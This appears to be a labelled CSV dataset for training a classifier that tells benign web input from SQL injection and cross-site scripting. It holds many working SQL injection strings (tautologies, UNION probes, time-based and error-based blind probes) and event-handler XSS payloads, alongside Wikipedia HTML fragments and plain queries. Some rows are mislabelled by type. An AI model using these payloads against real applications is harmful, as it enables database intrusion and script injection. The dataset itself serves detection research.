Text,Label,type
" </p><p>As machines become increasingly capable, tasks considered to require ""intelligence"" are often removed from the definition of AI, a phenomenon known as the <a href=""/wiki/AI_effect"" title=""AI effect"">AI effect </a>.<sup id=""cite_ref-3"" class=""reference""><a href=""#cite_note-3"">&#91;3&#93; </a> </sup> A quip in Tesler's Theorem says ""AI is whatever hasn't been done yet.""<sup id=""cite_ref-4"" class=""reference""><a href=""#cite_note-4"">&#91;4&#93; </a> </sup> For instance, <a href=""/wiki/Optical_character_recognition"" title=""Optical character recognition"">optical character recognition </a> is frequently excluded from things considered to be AI<sup id=""cite_ref-5"" class=""reference""><a href=""#cite_note-5"">&#91;5&#93; </a> </sup> , having become a routine technology.<sup id=""cite_ref-6"" class=""reference""><a href=""#cite_note-6"">&#91;6&#93; </a> </sup> Modern machine capabilities generally classified as AI include successfully <a href=""/wiki/Natural_language_understanding"" class=""mw-redirect"" title=""Natural language understanding"">understanding human speech </a>,<sup id=""cite_ref-FOOTNOTERussellNorvig2009_7-0"" class=""reference""><a href=""#cite_note-FOOTNOTERussellNorvig2009-7"">&#91;7&#93; </a> </sup> competing at the highest level in <a href=""/wiki/Strategic_game"" class=""mw-redirect"" title=""Strategic game"">strategic game </a> systems (such as <a href=""/wiki/Chess"" title=""Chess"">chess </a> and <a href=""/wiki/Go_(game)"" title=""Go (game)"">Go </a>),<sup id=""cite_ref-bbc-alphago_8-0"" class=""reference""><a href=""#cite_note-bbc-alphago-8"">&#91;8&#93; </a> </sup> <a href=""/wiki/Autonomous_car"" class=""mw-redirect"" title=""Autonomous car"">autonomously operating cars </a>, intelligent routing in <a href=""/wiki/Content_delivery_network"" title=""Content delivery network"">content delivery networks </a>, and <a href=""/wiki/Military_simulations"" class=""mw-redirect"" title=""Military simulations"">military simulations </a>.",0,xss
SELECT TOP 50 PERCENT * FROM Customers; SELECT * FROM CustomersFETCH FIRST 50 PERCENT ROWS ONLY;SELECT TOP 3 * FROM Customers,0,sql
SELECT AVG ( wood ) FROM term SELECT SUM ( smile ) ,0,sql
SELECT * FROM  ( SELECT porch FROM complete ) ,0,xss
-5774' where 3632  =  3632 or   (  3177  =  4222  )  *4222--,1,sql
37159,0,sql
" select * from users where id  =  1 or ""  )  .""  =  1 or 1  =  1 -- 1",1,sql
"<style>:target {color: red;}</style><acronym id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></acronym>",2,xss
1  )   as vxsh where 4706  =  4706,1,sql
"  SELECT * FROM title WHERE captured NOT IN  ( 'addition', 'cookies', 'previous' )  ",0,sql
"<style>:target {color:red;}</style><noembed id=x style=""transition:color 1s"" ontransitionend=alert(1)></noembed>",2,xss
"<rp oncontextmenu=""alert(1)"">test</rp>",2,xss
1'||  (  select 'bezt' where 7876  =  7876,1,sql
<animatemotion onpointermove=alert(1)>XSS</animatemotion>,2,xss
"<bgsound onmouseenter=""alert(1)"">test</bgsound>",2,xss
"<acronym ondblclick=""alert(1)"">test</acronym>",2,xss
"<picture onkeyup=""alert(1)"" contenteditable>test</picture>",2,xss
"1""  )   as wvxt where 7321  =  7321 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",1,xss
clara,0,xss
SELECT * FROM dress WHERE foreign NOT BETWEEN 'deer' AND 'away',0,sql
SELECT basis ( s )  FROM why UNION ALL,0,sql
"<a href=""/wiki/Search_algorithm"" title=""Search algorithm"">Search algorithms </a>:",0,xss
"<table draggable=""true"" ondragstart=""alert(1)"">test</table>",2,xss
"<div draggable=""true"" contenteditable>drag me</div><xmp ondrop=alert(1) contenteditable>drop here</xmp>",2,xss
SELECT * FROM color WHERE rush  BETWEEN 10 AND 20,0,sql
" SELECT * FROM coal ORDER BY closer, essential",0,sql
"  SELECT * FROM find WHERE barn IN  ( 'put', 'war', 'opinion' )  ",0,sql
"<footer onmousemove=""alert(1)"">test</footer>",2,xss
"<li><i><a href=""/wiki/Calculus_ratiocinator"" title=""Calculus ratiocinator"">Calculus ratiocinator </a> </i> and <i><a href=""/wiki/Characteristica_universalis"" title=""Characteristica universalis"">characteristica universalis </a> </i><span class=""nowrap"">&#160; ",0,xss
SELECT AVG ( sure ) FROM belt SELECT SUM ( half ) ,0,sql
"<ul draggable=""true"" ondrag=""alert(1)"">test</ul>",2,xss
urbina granda,0,sql
SELECT AVG ( faster ) FROM seldom SELECT SUM ( rain ) ,0,sql
SELECT COUNT ( noseID ) FROM fastened,0,sql
9810,0,sql
SELECT COUNT ( nuts ) FROM count,0,xss
"c/ cangas del narcea, 97, 12?e",0,xss
"<dfn onkeydown=""alert(1)"" contenteditable>test</dfn>",2,xss
"1%""   )    )     )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  ""%""  =  """,1,xss
corcoll duhalde,0,sql
1  )   as mtnw where 7293  =  7293 and 2603  =  5764--,1,sql
	 </span></a></dt><dd>Tune Scrapy for crawling a lot domains in parallel.</dd>,0,xss
SELECT * FROM bring FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM again,0,sql
" SELECT * FROM hurt ORDER BY longer, me",0,xss
SELECT AVG ( everything )  FROM prove  SELECT SUM ( glad ) ,0,sql
"<style>:target {color: red;}</style><fieldset id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></fieldset>",2,xss
SELECT * FROM earth WHERE duty = 'sign'  AND City = 'loose',0,xss
" SELECT column_name ( s )  FROM rule,bat",0,sql
"-3964""  )   where 3566  =  3566 order by 1--",1,sql
"	 </span> <span class=""toctext"">Finance and economics ",0,xss
</body>,0,xss
if  (  3593  =  3779  )   select 3593 else drop function qtqy--,1,sql
laguna del marquesado,0,sql
lagata,0,sql
estalell,0,sql
morrin,0,sql
73732702s,0,sql
	 </span> </li>,0,xss
"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and 'pczr'  =  'pczr",1,sql
SELECT TOP 3 * FROM citizen SELECT * FROM saw 3SELECT * FROM jungle,0,sql
"<menuitem oncontextmenu=""alert(1)"">test</menuitem>",2,xss
	 </span> </li>,0,xss
"<img ondblclick=""alert(1)"">test</img>",2,xss
SELECT * FROM visitor  WHERE once = somewhere,0,sql
seymour@evelin.gn,0,xss
solar,0,sql
"-7235""  )   union all select 4624,4624,4624,4624,4624,4624,4624,4624,4624,4624#",1,sql
"cardenal mendoza s/n, 7?h",0,xss
"<li><a href=""/wiki/McCarthy_91_function"" title=""McCarthy 91 function"">McCarthy 91 function </a> </li>",0,xss
admin'  )   or '1'  =  '1,1,sql
aldebar,0,sql
 or username like char  (  37  )  ;,1,sql
"<thead onmousedown=""alert(1)"">test</thead>",2,xss
SELECT COUNT ( chickenID ) FROM mile,0,sql
"SELECT ProductName, UnitPrice *  ( UnitsInStock + UnitsOnOrder )  FROM Products;",0,sql
SELECT COUNT ( perfect ) FROM captain,0,sql
SELECT * FROM smile 3,0,sql
medwin-whittinghill@enla.th,0,sql
1'   )    )    and   (  3020  =  3020  )  *6703 and    (    (   'pfal'  =  'pfal,1,sql
DELETE FROM breeze WHERE magic = 'money',0,sql
"<input draggable=""true"" ondrag=""alert(1)"">test</input>",2,xss
"1 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",1,sql
  <hr/>,0,xss
<progress onpointerdown=alert(1)>XSS</progress>,2,xss
"1 or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1,xss
"1' and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and 'zjxk'  =  'zjxk",1,xss
SELECT TOP 50 PERCENT * FROM church,0,sql
	 </span></a></dt><dd>Download files and/or images associated with your scraped items.</dd>,0,xss
savoula,0,sql
1'  )   where 3861  =  3861,1,xss
cosmo@vilainstal.sv,0,sql
"<summary draggable=""true"" ondragenter=""alert(1)"">test</summary>",2,xss
SELECT * FROM hang 3 SELECT * FROM against,0,sql
"<q draggable=""true"" ondragenter=""alert(1)"">test</q>",2,xss
"chorrito bajo, 11",0,xss
select * from users where id  =  1 or \.<1 or 1  =  1 -- 1,1,sql
-1217'   )    )     )   order by 1#,1,sql
"<li><a href=""/wiki/System_on_a_chip"" title=""System on a chip"">Systems on Chip (SoCs) </a> </li>",0,xss
"1  )   where 5096  =  5096 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1,sql
"<li><i><a href=""/wiki/Superintelligence:_Paths,_Dangers,_Strategies"" title=""Superintelligence: Paths, Dangers, Strategies"">Superintelligence: Paths, Dangers, Strategies </a> </i> </li> </ul>",0,xss
"1%""   )    )    order by 1#",1,sql
"1'   )    )    and elt  (  3114  =  3114,sleep  (  5   )    )   #",1,sql
"<hr onpaste=""alert(1)"" contenteditable>test</hr>",2,xss
"-9959""  )   or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  ""vcwc""  =  ""vcwc",1,sql
"	 </span>. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=unknown&amp;rft.jtitle=IEEE+Spectrum%3A+Technology%2C+Engineering%2C+and+Science+News&amp;rft.atitle=Full+Page+Reload&amp;rft_id=https%3A%2F%2Fspectrum.ieee.org%2Fbiomedical%2Fdiagnostics%2Fhow-ibm-watson-overpromised-and-underdelivered-on-ai-health-care&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,xss
SELECT * FROM stick WHERE natural LIKE '%anything%',0,xss
"<li><a href=""/wiki/Robot_ethics"" title=""Robot ethics"">Ethics </a> </li>",0,xss
"escritor miguel delibes 0, 7?b",0,sql
"		<li id=""footer-info-copyright"">Text is available under the <a rel=""license"" href=""//en.wikipedia.org/wiki/Wikipedia:Text_of_Creative_Commons_Attribution-ShareAlike_3.0_Unported_License"">Creative Commons Attribution-ShareAlike License </a><a rel=""license"" href=""//creativecommons.org/licenses/by-sa/3.0/"" style=""display:none;""> </a>;",0,xss
SELECT AVG ( suddenly ) FROM start,0,sql
SELECT * FROM cut,0,sql
"  <div class=""wy-grid-for-nav"">",0,xss
mackenna.papac@interpretacion-diccionario-y-significado-de-los-s,0,sql
" SELECT * FROM worth ORDER BY oxygen, follow",0,sql
"  SELECT * FROM married WHERE enter NOT IN  ( 'monkey', 'graph', 'feed' )  ",0,sql
"<a onkeyup=""alert(1)"" contenteditable>test</a>",2,xss
"  UPDATE pattern SET somehow =  'take', City =  'unhappy' WHERE avoid =  grass",0,sql
"1'||  (  select 'lstx' from dual where 2972  =  2972 or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7   )    )   ||'",1,sql
SELECT football ( s )  FROM lovely LEFT JOIN,0,sql
2.38947E+15,0,xss
SELECT * FROM to FETCH FIRST 50 PERCENT ROWS ONLY,0,sql
<iframe id=x onfocus=alert(1)>,2,xss
	 </span> </a> </li>,0,xss
"<li><cite id=""CITEREFDoweHajek1997"" class=""citation journal"">Dowe, D. L.; Hajek, A. R. (1997). <a rel=""nofollow"" class=""external text"" href=""https://web.archive.org/web/20110628194905/http://www.csse.monash.edu.au/publications/1997/tr-cs97-322-abs.html"">""A computational extension to the Turing Test"" </a>. <i>Proceedings of the 4th Conference of the Australasian Cognitive Science Society </i>. Archived from <a rel=""nofollow"" class=""external text"" href=""http://www.csse.monash.edu.au/publications/1997/tr-cs97-322-abs.html"">the original </a> on 28 June 2011. </cite><span title=""ctx_ver=Z39.88-2004&amp;rft_val_fmt=info%3Aofi%2Ffmt%3Akev%3Amtx%3Ajournal&amp;rft.genre=article&amp;rft.jtitle=Proceedings+of+the+4th+Conference+of+the+Australasian+Cognitive+Science+Society&amp;rft.atitle=A+computational+extension+to+the+Turing+Test&amp;rft.date=1997&amp;rft.aulast=Dowe&amp;rft.aufirst=D.+L.&amp;rft.au=Hajek%2C+A.+R.&amp;rft_id=http%3A%2F%2Fwww.csse.monash.edu.au%2Fpublications%2F1997%2Ftr-cs97-322-abs.html&amp;rfr_id=info%3Asid%2Fen.wikipedia.org%3AArtificial+intelligence"" class=""Z3988""> ",0,xss
"<li><a href=""/wiki/Mathematical_optimization"" title=""Mathematical optimization"">Search methodology </a> </li>",0,xss
1'  )   and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and   (  'nqol'  =  'nqol,1,sql
bertilia,0,sql
"c/ fernandez shaw, 177 1-e",0,sql
"<style>:target {color:red;}</style><template id=x style=""transition:color 1s"" ontransitionend=alert(1)></template>",2,xss
SELECT LOG ( 2 ) ;,0,xss
-1886' where 5518  =  5518 or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --,1,sql
"<div draggable=""true"" contenteditable>drag me</div><dt ondrop=alert(1) contenteditable>drop here</dt>",2,xss
"1""   )    )     )   and   (  7758  =  4628  )  *4628 and    (    (     (  ""wzas""  =  ""wzas",1,sql
"1'||  (  select 'iocs' where 9287  =  9287 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )     )  ||'",1,sql
4562,0,sql
SELECT attention ( s )  FROM trunk UNION,0,sql
SELECT column_name ( s )  FROM table2; SELECT City FROM Customers,0,xss
"<li><a href=""/wiki/Marian_Mazur"" title=""Marian Mazur"">Marian Mazur </a> </li>",0,xss
<body ontouchend=alert(1)> ,2,xss
<style onreadystatechange=alert(1)></style>,2,xss
 </li>,0,xss
SELECT * FROM spider ORDER BY driver,0,sql
"-9281  )   where 8363  =  8363 or make_set  (  8220  =  5127,5127  )  --",1,sql
1'+  (  select 'hjku' where 1954  =  1954 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno   )    )   +',1,sql
"<var onmousedown=""alert(1)"">test</var>",2,xss
SELECT * FROM paper WHERE night NOT LIKE 'basic%',0,sql
<h1 onblur=alert(1) tabindex=1 id=x></h1><input autofocus>,2,xss
SELECT COUNT ( villageID ) FROM as,0,sql
"	 </span><a href=""/w/index.php?title=Artificial_intelligence&amp;action=edit&amp;section=10"" title=""Edit section: Perception"">edit </a><span class=""mw-editsection-bracket"">] ",0,xss
14602519a,0,sql
"1  )   procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",1,sql
"1  )   where 5232  =  5232 union all select null,null,null#",1,sql
vlahos,0,sql
"1   )    )     )   union all select null,null,null,null,null,null,null#",1,xss
"1'||  (  select 'ryom' where 1134  =  1134 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",1,sql
aguilar de cods,0,xss
garmasin,0,sql
<textarea onauxclick=alert(1)>XSS</textarea>,2,xss
SELECT hearing FROM local UNION SELECT short FROM film ORDER BY show,0,sql
" select * from users where id  =  1 union select @||1,version  (    )   -- 1",1,sql
"1'+  (  select jqyo where 4426  =  4426 and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3   )    )   +'",1,sql
1'+  (  select 'rejz' where 1530  =  1530 and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )      )    )   +',1,sql
SELECT * FROM think WHERE property BETWEEN kill09/01/1996flag AND yourself15/31/1996love,0,sql
SELECT COUNT ( mailID ) FROM shore,0,sql
SELECT AVG ( shot ) FROM design,0,sql
SELECT Count ( * )  AS remember,0,sql
"<title onmouseover=""alert(1)"">test</title>",2,xss
"-2085""  )   as hkev where 7730  =  7730 union all select 7730,7730--",1,sql
suwanawo5,0,sql
<animatemotion onpointerout=alert(1)>XSS</animatemotion>,2,xss
"<hgroup onmouseout=""alert(1)"">test</hgroup>",2,xss
"1   )    )    or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   5888  =  5888",1,sql
"<style>@keyframes slidein {}</style><xss style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></xss>",2,xss
"1  )   and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  ",1,sql
"-6965'  )   union all select 2857,2857,2857,2857,2857,2857,2857,2857,2857,2857--",1,xss
"	 </span>. <i>Cell </i>. <b>172 </b> (5): 1122–1131.e9. <a href=""/wiki/Digital_object_identifier"" title=""Digital object identifier"">doi </a>:<a rel=""nofollow"" class=""external text"" href=""https://doi.org/10.1016%2Fj.cell.2018.02.010"">10.1016/j.cell.2018.02.010 </a>. <a href=""/wiki/PubMed_Identifier"" class=""mw-redirect"" title=""PubMed Identifier"">PMID </a>&#160;<a rel=""nofollow"" class=""external text"" href=""//pubmed.ncbi.nlm.nih.gov/29474911"">29474911 </a><span class=""reference-accessdate"">. Retrieved <span class=""nowrap"">18 December ",0,xss
"rua bamio, 190 11?h",0,sql
"<ol><li>If someone has a ""threat"" (that is, two in a row), take the remaining square. Otherwise, </li>",0,xss
"-8893  )   union all select 7594,7594,7594,7594,7594,7594#",1,sql
	 </span> 2018 ,0,xss
"<li><a href=""/wiki/Albert_Einstein"" title=""Albert Einstein"">Albert Einstein </a> </li>",0,xss
SELECT AVG ( relationship ) FROM fox,0,sql
 </p>,0,xss
"<li><a href=""/wiki/Racetrack_memory"" title=""Racetrack memory"">Racetrack memory </a> </li>",0,xss
"1"" and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1,xss
"<li class=""toctree-l1""><a class=""reference internal"" href=""topics/debug.html"">Debugging Spiders</a></li>",0,xss
"1'   )    )     )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  'jwbt'  =  'jwbt",1,sql
SELECT COUNT ( businessID ) FROM distant,0,sql
SELECT MIN ( directly )  AS notice FROM related,0,sql
SELECT neighbor ( s )  FROM wide UNION ALL,0,sql
SELECT * FROM sudden,0,sql
subidor,0,sql
SELECT QUARTER ( CURDATE (   )  )  ;,0,sql
fisicoqumico,0,sql
cosme,0,sql
SELECT arrangement ( s )  FROM ocean FULL OUTER JOIN,0,sql
SELECT * FROM anybody WHERE dear = 'dirt' FETCH FIRST 3 ROWS ONLY,0,sql
1' in boolean mode  )   and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  #,1,xss
"1""  )   where 6859  =  6859 union all select null,null,null,null,null,null,null,null#",1,sql
"finca el jardinito, 155,",0,sql
	 </span>,0,xss
1'+  (  select ahyw where 6893  =  6893 waitfor delay '0:0:5'--,1,sql
"  UPDATE political SET bridge =  'eventually', City =  'youth' WHERE tone =  cloth",0,sql
" select * from users where id  =  1 or ""1  (  ""  =  1 or 1  =  1 -- 1",1,sql
